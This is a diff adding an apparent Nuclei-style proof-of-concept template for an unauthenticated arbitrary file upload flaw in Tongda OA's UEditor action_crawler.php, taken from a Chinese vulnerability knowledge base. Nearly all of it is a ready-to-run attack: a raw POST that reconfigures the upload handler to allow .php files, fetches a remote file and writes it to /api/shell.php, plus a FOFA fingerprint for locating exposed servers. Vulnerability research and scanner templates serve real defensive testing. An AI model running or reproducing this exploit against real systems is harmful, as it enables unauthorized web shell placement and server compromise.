@@ -1,0 +1,48 @@
+id: poc-qv0xntqraqp7mfi0
+info:
+  name: 通达OA action_crawler 前台任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qv0xntqraqp7mfi0'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: qv0xntqraqp7mfi0
+    fofa: title="office Anywhere" && icon_hash="-759108386" && "2016"
+http:
+- raw:
+  - 'POST /module/ueditor/php/action_crawler.php HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    CONFIG[catcherPathFormat]=/api/shell&CONFIG[catcherMaxSize]=100000&CONFIG[catcherAllowFiles][]=.php&CONFIG[catcherAllowFiles][]=.ico&CONFIG[catcherFieldName]=file&file[]=https://www.baidu.com/img/flexible/logo/pc/result.png
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /api/shell.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
